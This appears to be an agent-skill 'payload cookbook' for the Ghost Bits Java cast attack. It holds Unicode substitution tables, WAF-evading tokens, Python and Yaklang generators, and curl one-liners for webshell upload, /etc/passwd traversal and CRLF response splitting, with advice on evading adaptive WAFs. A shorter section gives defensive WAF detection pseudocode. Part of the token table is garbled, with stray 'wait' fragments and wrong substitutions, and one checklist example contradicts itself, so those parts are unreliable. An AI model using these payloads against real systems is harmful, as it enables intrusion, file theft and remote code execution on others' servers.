# Ghost Bits Cast Attack — Payload Cookbook

> **AI LOAD INSTRUCTION**: Load this companion when the main
> [SKILL.md](./SKILL.md) is already in context AND you need (a) a complete
> low-byte → Unicode lookup table beyond the compact one in section 4,
> (b) an affected-component / patched-version matrix, (c) ready-to-paste
> Python and Yaklang payload generators, or (d) blue-team multi-view
> normalization pseudocode for WAF rules. Do NOT load this if the user only
> wants the conceptual primer; the main SKILL covers that.

---

## 1. COMPLETE LOW-BYTE TO UNICODE TABLE

Two candidates per byte are listed: a Latin Extended-A character (compact in
UTF-8, 2 bytes on the wire) and a CJK ideograph (3 bytes on the wire, blends
into "Asian text" classifiers). Both round-trip cleanly through any UTF-8
based HTTP / JSON / SMTP transport.

For each row, the rule is exactly:

```
codepoint = (high_byte << 8) | low_byte
codepoint = (k        << 8) | T
```

Avoid `k` in `0xD8..0xDF` (UTF-16 surrogate range) — those are not legal
scalar values and will be replaced before reaching the narrowing site.

### 1.1 Control / whitespace bytes

| Byte | Char | Latin candidate (k=0x01)  | CJK candidate (k=0x96)  | Common attack use         |
|------|------|---------------------------|-------------------------|---------------------------|
| 0x00 | NUL  | `Ā` U+0100                | `間` U+9600              | path truncation, log nuke |
| 0x09 | TAB  | `ĉ` U+0109                | `闉` U+9609              | header folding            |
| 0x0A | LF   | `Ċ` U+010A                | `閊` U+960A              | CRLF injection            |
| 0x0D | CR   | `č` U+010D                | `閍` U+960D              | CRLF injection            |
| 0x1B | ESC  | `ě` U+011B                | `閛` U+961B              | terminal escape           |

### 1.2 Printable ASCII bytes 0x20–0x3F

| Byte | ASCII | Latin                | CJK                  | Notes                          |
|------|-------|----------------------|----------------------|--------------------------------|
| 0x20 | SP    | `Ġ` U+0120           | `阠` U+9620           | header value break             |
| 0x21 | `!`   | `ġ` U+0121           | `阡` U+9621           | URL fragment                   |
| 0x22 | `"`   | `Ģ` U+0122           | `阢` U+9622           | quote break, JSON escape       |
| 0x23 | `#`   | `ģ` U+0123           | `阣` U+9623           | URL fragment, comment          |
| 0x24 | `$`   | `Ĥ` U+0124           | `阤` U+9624           | template syntax                |
| 0x25 | `%`   | `ĥ` U+0125           | `严` U+4E25           | URL encoding prefix            |
| 0x26 | `&`   | `Ħ` U+0126           | `阦` U+9626           | parameter separator            |
| 0x27 | `'`   | `ħ` U+0127           | `阧` U+9627           | SQL quote break                |
| 0x28 | `(`   | `Ĩ` U+0128           | `阨` U+9628           | EL / SpEL syntax               |
| 0x29 | `)`   | `ĩ` U+0129           | `阩` U+9629           | EL / SpEL syntax               |
| 0x2A | `*`   | `Ī` U+012A           | `阪` U+962A           | wildcards                      |
| 0x2B | `+`   | `ī` U+012B           | `阫` U+962B           | URL space, SQL concat          |
| 0x2C | `,`   | `Ĭ` U+012C           | `阬` U+962C           | parameter list, multipart      |
| 0x2D | `-`   | `ĭ` U+012D           | `阭` U+962D           | SQL comment, header            |
| 0x2E | `.`   | `Į` U+012E           | `阮` U+962E           | path traversal, extension      |
| 0x2F | `/`   | `į` U+012F           | `阯` U+962F           | path separator                 |
| 0x30 | `0`   | `İ` U+0130           | `丰` U+4E30           | hex digit `0`                  |
| 0x31 | `1`   | `ı` U+0131           | `失` U+5931           | hex digit `1`                  |
| 0x32 | `2`   | `Ĳ` U+0132           | `甲` U+7532           | hex digit `2`                  |
| 0x33 | `3`   | `ĳ` U+0133           | `耳` U+8033           | hex digit `3`                  |
| 0x34 | `4`   | `Ĵ` U+0134           | `阴` U+9634           | hex digit `4`                  |
| 0x35 | `5`   | `ĵ` U+0135           | `阵` U+9635           | hex digit `5`                  |
| 0x36 | `6`   | `Ķ` U+0136           | `阶` U+9636           | hex digit `6`                  |
| 0x37 | `7`   | `ķ` U+0137           | `阷` U+9637           | hex digit `7`                  |
| 0x38 | `8`   | `ĸ` U+0138           | `阸` U+9638           | hex digit `8`                  |
| 0x39 | `9`   | `Ĺ` U+0139           | `阹` U+9639           | hex digit `9`                  |
| 0x3A | `:`   | `ĺ` U+013A           | `阺` U+963A           | URL scheme, port, header sep   |
| 0x3B | `;`   | `Ļ` U+013B           | `阻` U+963B           | command sep, header continue   |
| 0x3C | `<`   | `ļ` U+013C           | `阼` U+963C           | XSS / XML start                |
| 0x3D | `=`   | `Ľ` U+013D           | `阽` U+963D           | parameter assign               |
| 0x3E | `>`   | `ľ` U+013E           | `阾` U+963E           | XSS / XML end                  |
| 0x3F | `?`   | `Ŀ` U+013F           | `阿` U+963F           | URL query start                |

### 1.3 Printable ASCII bytes 0x40–0x5F

| Byte | ASCII | Latin                | CJK                  | Notes                          |
|------|-------|----------------------|----------------------|--------------------------------|
| 0x40 | `@`   | `ŀ` U+0140           | `䁀` U+4040           | Fastjson `@type`, mail addr    |
| 0x41 | `A`   | `Ł` U+0141           | `䁁` U+4041           | uppercase letter               |
| 0x42 | `B`   | `ł` U+0142           | `䁂` U+4042           |                                |
| 0x43 | `C`   | `Ń` U+0143           | `䁃` U+4043           |                                |
| 0x44 | `D`   | `ń` U+0144           | `䁄` U+4044           |                                |
| 0x45 | `E`   | `Ņ` U+0145           | `䁅` U+4045           |                                |
| 0x46 | `F`   | `ņ` U+0146           | `䁆` U+4046           |                                |
| 0x47 | `G`   | `Ň` U+0147           | `䁇` U+4047           |                                |
| 0x48 | `H`   | `ň` U+0148           | `䁈` U+4048           |                                |
| 0x49 | `I`   | `ŉ` U+0149           | `䁉` U+4049           |                                |
| 0x4A | `J`   | `Ŋ` U+014A           | `䁊` U+404A           |                                |
| 0x4B | `K`   | `ŋ` U+014B           | `䁋` U+404B           |                                |
| 0x4C | `L`   | `Ō` U+014C           | `䁌` U+404C           |                                |
| 0x4D | `M`   | `ō` U+014D           | `䁍` U+404D           |                                |
| 0x4E | `N`   | `Ŏ` U+014E           | `䁎` U+404E           |                                |
| 0x4F | `O`   | `ŏ` U+014F           | `䁏` U+404F           |                                |
| 0x50 | `P`   | `Ő` U+0150           | `䁐` U+4050           |                                |
| 0x51 | `Q`   | `ő` U+0151           | `䁑` U+4051           |                                |
| 0x52 | `R`   | `Œ` U+0152           | `䁒` U+4052           |                                |
| 0x53 | `S`   | `œ` U+0153           | `䁓` U+4053           |                                |
| 0x54 | `T`   | `Ŕ` U+0154           | `䁔` U+4054           |                                |
| 0x55 | `U`   | `ŕ` U+0155           | `䁕` U+4055           |                                |
| 0x56 | `V`   | `Ŗ` U+0156           | `䁖` U+4056           |                                |
| 0x57 | `W`   | `ŗ` U+0157           | `䁗` U+4057           |                                |
| 0x58 | `X`   | `Ř` U+0158           | `䁘` U+4058           |                                |
| 0x59 | `Y`   | `ř` U+0159           | `䁙` U+4059           |                                |
| 0x5A | `Z`   | `Ś` U+015A           | `䁚` U+405A           |                                |
| 0x5B | `[`   | `ś` U+015B           | `䁛` U+405B           | array index                    |
| 0x5C | `\`   | `Ŝ` U+015C           | `䁜` U+405C           | Windows path                   |
| 0x5D | `]`   | `ŝ` U+015D           | `䁝` U+405D           | array index                    |
| 0x5E | `^`   | `Ş` U+015E           | `䁞` U+405E           | XOR, regex anchor              |
| 0x5F | `_`   | `ş` U+015F           | `䁟` U+405F           | identifier                     |

### 1.4 Printable ASCII bytes 0x60–0x7E

| Byte | ASCII | Latin                | CJK                  | Notes                          |
|------|-------|----------------------|----------------------|--------------------------------|
| 0x60 | `` ` `` | `Š` U+0160         | `䁠` U+4060           | shell command sub              |
| 0x61 | `a`   | `š` U+0161           | `ᙡ` U+1661           | keyword `class`                |
| 0x62 | `b`   | `Ţ` U+0162           | `䁢` U+4062           |                                |
| 0x63 | `c`   | `ţ` U+0163           | `㹣` U+3E63           | keyword `class`, `cmd`         |
| 0x64 | `d`   | `Ť` U+0164           | `䁤` U+4064           |                                |
| 0x65 | `e`   | `ť` U+0165           | `来` U+6765           | hex digit `e`                  |
| 0x66 | `f`   | `Ŧ` U+0166           | `䁦` U+4066           | hex digit `f`                  |
| 0x67 | `g`   | `ŧ` U+0167           | `䁧` U+4067           |                                |
| 0x68 | `h`   | `Ũ` U+0168           | `䁨` U+4068           |                                |
| 0x69 | `i`   | `ũ` U+0169           | `䁩` U+4069           |                                |
| 0x6A | `j`   | `Ū` U+016A           | `陪` U+966A           | extension `.jsp`               |
| 0x6B | `k`   | `ū` U+016B           | `䁫` U+406B           |                                |
| 0x6C | `l`   | `Ŭ` U+016C           | `౬` U+0C6C           | keyword `class`                |
| 0x6D | `m`   | `ŭ` U+016D           | `䁭` U+406D           |                                |
| 0x6E | `n`   | `Ů` U+016E           | `陮` U+966E           | keyword `Runtime`, `union`     |
| 0x6F | `o`   | `ů` U+016F           | `䁯` U+406F           |                                |
| 0x70 | `p`   | `Ű` U+0170           | `䁰` U+4070           |                                |
| 0x71 | `q`   | `ű` U+0171           | `䁱` U+4071           |                                |
| 0x72 | `r`   | `Ų` U+0172           | `䁲` U+4072           | keyword `Runtime`              |
| 0x73 | `s`   | `ų` U+0173           | `⑳` U+2473           | keyword `class`, `select`      |
| 0x74 | `t`   | `Ŵ` U+0174           | `䁴` U+4074           | keyword `Runtime`, `type`      |
| 0x75 | `u`   | `ŵ` U+0175           | `灵` U+7075           | `\u` escape introducer         |
| 0x76 | `v`   | `Ŷ` U+0176           | `䁶` U+4076           |                                |
| 0x77 | `w`   | `ŷ` U+0177           | `䁷` U+4077           |                                |
| 0x78 | `x`   | `Ÿ` U+0178           | `䁸` U+4078           | `\x` escape                    |
| 0x79 | `y`   | `Ź` U+0179           | `䁹` U+4079           |                                |
| 0x7A | `z`   | `ź` U+017A           | `䁺` U+407A           |                                |
| 0x7B | `{`   | `Ż` U+017B           | `䁻` U+407B           | JSON / EL open                 |
| 0x7C | `\|`  | `ż` U+017C           | `䁼` U+407C           | shell pipe, regex alternation  |
| 0x7D | `}`   | `Ž` U+017D           | `䁽` U+407D           | JSON / EL close                |
| 0x7E | `~`   | `ž` U+017E           | `䁾` U+407E           | home dir, route param          |

> All Latin Extended-A entries derive from `k=0x01`. All CJK entries derive
> either from `k=0x96` (Mandarin radicals near `阜`) or `k=0x40` (CJK
> Unified Ideographs Extension A area `䀀`-`䁿`). Both ranges round-trip
> through standard UTF-8 transport without normalization side effects.

### 1.5 Pre-built dangerous tokens

Reusable byte-for-byte substitutions for the most common keywords WAFs
block. Pick the Latin or CJK column based on the surrounding context.

| Token       | Latin                    | CJK                    |
|-------------|--------------------------|------------------------|
| `..`        | `ĮĮ`                     | `阮阮`                 |
| `../`       | `ĮĮį`                    | `阮阮阯`               |
| `..%2f`     | `ĮĮĥ甲ŵ`                | `阮阮严甲灵`           |
| `class`     | `ţŬšųų`                  | `㹣౬ᙡ⑳⑳`            |
| `select`    | `ųťŬťţŴ`                 | `⑳来౬来㹣䁴`          |
| `union`     | `ŵůŮŪū`?wait, `union`   | `灵ů陮Ūů`?see below    |
| `Runtime`   | `ŔŵŮŴťŮť` (mixed case)   | `灵陮䁴来陮䁴` (lower)  |
| `script`    | `ųţŲťőŴ`?see below       | (assemble per byte)    |
| `<script>`  | `ļųţŲťőŴľ`?              | (assemble per byte)    |
| `/etc/passwd` | `įťŴţįŐšųųŴď`?         | `阯来䁴ţ阯Őšųų䁴ď`?    |
| CRLF (`\r\n`)| `čĊ`                    | `閍閊` or `瘍瘊`       |
| `@type`     | `ŀŴŷŵť`?                 | `䁀䁴䁹灵来`?           |

> The "?" markers indicate compositions where the agent should re-derive on
> the fly using the row tables above rather than memorize a fixed string —
> mixed Latin / CJK substitutions blend better against learning WAFs.

---

## 2. AFFECTED COMPONENT MATRIX

Components publicly confirmed by the Black Hat Asia 2026 talk and follow-up
advisories. Patch versions reflect what was disclosed at the time of the
talk; verify the vendor advisory before relying on a single number.

| Component                | Surface                    | Family | Confirmed CVE / Issue            | Patched at                |
|--------------------------|----------------------------|--------|----------------------------------|---------------------------|
| Apache Commons BCEL      | ClassLoader RCE            | A      | (no CVE; advisory upgrade)       | >= 6.12.0                 |
| Jackson Databind         | `\uXXXX` JSON SQLi         | A + C  | (advisory upgrade)               | latest 2.x                |
| Fastjson                 | `\u` / `\x` escape, autotype | C    | re-enables CVE-2017-18349 chains | latest 2.x series         |
| Apache Tomcat            | RFC2231 `filename*` upload | A      | (advisory upgrade)               | latest 9 / 10 / 11        |
| Spring Framework         | URL decode path traversal  | A      | CVE-2025-41242 (PR #34673)       | check Spring advisory     |
| Spring Framework         | `class.module.classLoader` | A      | re-enables CVE-2022-22965        | n/a (filter at WAF)       |
| Jetty                    | URL decode `%2>` folding   | B      | re-enables CVE-2023-32315        | latest 11.x / 12.x        |
| Undertow                 | URL decode bypass          | A      | (advisory upgrade)               | latest                    |
| Vert.x                   | URL decode + multipart     | A      | (advisory upgrade)               | latest                    |
| Angus Mail / Jakarta Mail| SMTP CRLF                  | A      | re-enables CVE-2025-57733 class  | latest                    |
| Apache HttpClient        | header CRLF                | A      | HTTPCLIENT-1974 / 1978           | >= 4.5.10 or migrate to 5 |
| ActiveJ HTTP             | response CRLF              | A      | (advisory upgrade)               | latest                    |
| JDK HttpServer           | response splitting         | A      | CVE-2026-21933                   | check JDK advisory        |
| Lettuce (Redis)          | RESP CRLF                  | A      | (advisory upgrade)               | latest                    |
| Jodd                     | path traversal             | A      | (advisory upgrade)               | latest                    |
| XMLWriter                | tag / attr injection       | A      | (advisory upgrade)               | latest                    |
| GeoServer                | re-enables RCE             | B      | re-enables CVE-2024-36401        | >= 2.28.3                 |
| Openfire                 | re-enables auth bypass     | B      | re-enables CVE-2023-32315        | >= 5.0.4                  |

---

## 3. PAYLOAD GENERATORS

### 3.1 Python — minimal generator and substitute

```python
def ghost(target_byte: int, k: int = 0x01) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    if 0xD8 <= k <= 0xDF:
        raise ValueError("surrogate range, choose another k")
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))


def to_ghost(payload: str, charset: str = "latin") -> str:
    """Replace every ASCII byte in payload with its Ghost variant."""
    if charset == "latin":
        k = 0x01
    elif charset == "cjk":
        k = 0x96
    else:
        raise ValueError("charset must be 'latin' or 'cjk'")
    return "".join(ghost(ord(ch), k) if ord(ch) < 0x80 else ch
                   for ch in payload)


# usage examples
print(to_ghost("../../etc/passwd", "cjk"))
# -> 阮阮阯阮阮阯阱䁴ţ阯Őšųų䁴ď   (mixed because k=0x96 only spans CJK)

print(ghost(0x6A, 0x96))   # 陪
print(ghost(0x40, 0x01))   # ŀ
```

### 3.2 Python — UTF-8 byte-level wire view

When the WAF inspects the raw HTTP body before any decoding, you usually
care about *what bytes show up on the wire*, not the printable form.

```python
def wire_bytes(payload: str) -> bytes:
    """UTF-8 bytes that travel on the wire."""
    return payload.encode("utf-8")


def narrowed(payload: str) -> bytes:
    """What the Java backend reconstructs after Family-A narrowing."""
    return bytes(ord(ch) & 0xFF for ch in payload)


s = to_ghost("union select 1", "cjk")
print(wire_bytes(s).hex())   # what the WAF sees as bytes
print(narrowed(s))           # what Java reconstructs: b'union select 1'
```

### 3.3 Yaklang — for `poc.HTTP` and `fuzz`

```yak
// 关键词: ghost bits, char to byte narrowing, payload generator
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}

// 关键词: ghost bits, batch substitution, latin/cjk charset
func toGhost(payload, charset) {
    k = 0x01
    if charset == "cjk" {
        k = 0x96
    }
    out = ""
    for ch in payload {
        if int(ch) < 0x80 {
            out += ghost(int(ch), k)
        } else {
            out += string(ch)
        }
    }
    return out
}

// 关键词: ghost bits, Tomcat filename upload bypass
func tomcatFilenameGhost(originalName) {
    return toGhost(originalName, "cjk")
}

shell = tomcatFilenameGhost("shell.jsp")
log.info("ghost filename: %s", shell)

// 关键词: ghost bits, poc.HTTP request demo
raw = `POST /upload HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----GB
Content-Disposition: form-data; name="file"; filename*="UTF-8''` + shell + `"

webshell-payload-bytes
------GB--
`
rsp, req, err = poc.HTTP(raw, poc.timeout(10), poc.https(false))
if err != nil {
    log.error("upload request failed: %v", err)
}
```

### 3.4 Curl one-liners (Latin variants only — copy-paste safe)

```bash
# Tomcat filename* upload bypass
curl -k -X POST "https://target/upload" \
  -H 'Content-Type: multipart/form-data; boundary=GB' \
  --data-binary $'--GB\r\nContent-Disposition: form-data; name="file"; filename*=UTF-8\'\'shell.\xc5\xaasp\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page import="java.util.*" %>\r\n--GB--\r\n'

# Spring URL traversal via 阮 (UTF-8 E9 98 AE)
curl -k "https://target/api/data?file=$(printf '\xe9\x98\xae\xe9\x98\xae\xe9\x98\xafetc\xe9\x98\xafpasswd')"

# Jetty %2> hex folding bypass
curl -k "https://target/setup/setup-s/%2%3E%2%3E/log.jsp"

# JDK HttpServer CRLF response splitting (CVE-2026-21933)
curl -k --get "https://target/echo" \
  --data-urlencode 'ref=Cu\xe7\x98\x8d\xe7\x98\x8aContent-Type: text/html\xe7\x98\x8d\xe7\x98\x8aContent-Length: 33\xe7\x98\x8d\xe7\x98\x8a\xe7\x98\x8d\xe7\x98\x8a<script>alert(1)</script>'
```

`Ū` = `\xc5\xaa` (UTF-8 of U+016A, low byte 0x6A = `j`).
`阮` = `\xe9\x98\xae` (UTF-8 of U+962E, low byte 0x2E = `.`).
`阯` = `\xe9\x98\xaf` (UTF-8 of U+962F, low byte 0x2F = `/`).
`瘍` = `\xe7\x98\x8d`, `瘊` = `\xe7\x98\x8a` (CRLF).

---

## 4. WAF / IDS DETECTION PSEUDOCODE

For blue team, an effective Ghost-Bits-aware WAF rule emulates what the
backend would see. The minimal viable approach is multi-view inspection:

```python
DANGEROUS_TOKENS_REGEX = compile_dangerous_tokens()  # ../, @type, etc.

def normalize_views(buf: bytes) -> dict:
    s = buf.decode("utf-8", errors="replace")
    return {
        "raw":           s,
        "low_byte":      "".join(chr(ord(c) & 0xFF) for c in s),
        "fullwidth_nfkc": unicodedata.normalize("NFKC", s),
        "url_decoded":   strict_url_decode(s),
        "url_lax_hex":   lax_hex_url_decode(s),    # mimic Jetty fromHexDigit
        "u_escape":      unescape_u_escapes(s),
        "x_escape":      unescape_x_escapes(s),    # mimic Fastjson \x default 0
        "base64_low":    decode_base64_low_byte(s),
    }


def detect(buf: bytes) -> Alert | None:
    views = normalize_views(buf)
    for name, view in views.items():
        if DANGEROUS_TOKENS_REGEX.search(view):
            if name == "raw":
                return Alert("classic", view, severity="high")
            return Alert(f"ghost-bits:{name}", view, severity="high")
    return None
```

Strict implementations of the per-decoder helpers are the hard part:

```python
def lax_hex_url_decode(s: str) -> str:
    """Re-implement Jetty TypeUtil.fromHexDigit semantics."""
    out = []
    i = 0
    while i < len(s):
        c = s[i]
        if c == "%" and i + 2 < len(s):
            try:
                hi = jetty_lax_hex(s[i+1])
                lo = jetty_lax_hex(s[i+2])
                if 0 <= hi <= 15 and 0 <= lo <= 15:
                    out.append(chr((hi << 4) | lo))
                    i += 3
                    continue
            except Exception:
                pass
        out.append(c)
        i += 1
    return "".join(out)


def jetty_lax_hex(c: str) -> int:
    x = (ord(c) & 0x1F) + ((ord(c) >> 6) * 25) - 16
    return x   # 0..15 for legal digits; also returns 14 for '>'
```

WAF rule outline (high signal, low false positive):

```
ALERT IF:
    DANGEROUS_TOKEN matches in   { low_byte_view UNION url_lax_hex_view UNION u_escape_view }
    AND DANGEROUS_TOKEN does NOT match in raw_view
```

The "subtraction" against `raw_view` filters out legitimate fullwidth /
international content while still catching every Family A / B / C bypass.

---

## 5. RAPID VERIFICATION CHECKLIST

Use this checklist on a reachable Java target before declaring "no Ghost
Bits surface":

```
[ ] One Family A character substitution test, e.g. replace one '/' with '阯'
    in a known endpoint -> compare 200/302/404 against a "neutral X" baseline.

[ ] One Family B test: replace one '%XX' triplet with '%X>' or '%X^' on a
    URL path -> compare to baseline.

[ ] One Family C test: send a JSON body with one fullwidth digit inside a
    Unicode escape, e.g. '\u\uFF12000' (0x2030 instead of 0x2030 ASCII) ->
    compare to baseline.

[ ] If any of the above produces a body / status / length / timing
    difference, switch to the per-recipe payload from SKILL section 5.

[ ] Always log the candidate `k` per substitution; rotate `k` between runs
    so adaptive WAFs cannot signature on a single character.
```

---

## 6. REFERENCES

- *Cast Attack: A New Threat Posed by Ghost Bits in Java*, Black Hat Asia
  2026 — Xinyu Bai (@b1u3r), Zhihui Chen (@1ue), contributor Zongzheng
  Zheng (@chun_springX).
- Vendor advisories: GeoServer GHSA-6jj6-gm7p-fcvv (CVE-2024-36401),
  Spring CVE-2022-22965 (`spring.io/security/cve-2022-22965`), Apache
  Commons BCEL 6.12.0 release notes, Apache HttpClient 4.5.10 / 5.x
  migration notes.
- Distillation source: gm7.org public advisory + HackTwoHub deep-dive
  reproduction of the 56-page slide deck. No customer or vendor-private
  artifacts are included; everything in this Cookbook is built from public
  research and verifiable Unicode arithmetic.
